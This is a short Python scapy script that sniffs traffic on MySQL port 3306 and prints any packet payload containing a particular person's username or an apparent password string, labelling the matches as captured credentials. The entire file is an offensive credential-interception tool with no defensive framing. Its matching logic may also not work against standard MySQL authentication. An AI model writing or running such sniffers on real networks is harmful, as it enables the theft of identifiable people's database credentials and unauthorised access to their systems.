#!/usr/bin/env python3
from scapy.all import *
import re

def extract_mysql_creds(packet):
    if packet.haslayer(Raw):
        payload = str(packet[Raw])
        # Look for MySQL auth packets containing credentials
        if "sarah_chen" in payload or "Portfolio2024" in payload:
            print(f"[CREDS CAPTURED] {payload}")
            return True
        return False
print("[CAPTURE] Monitoring for MySQL credentials...")
sniff(filter="port 3306", prn=extract_mysql_creds)
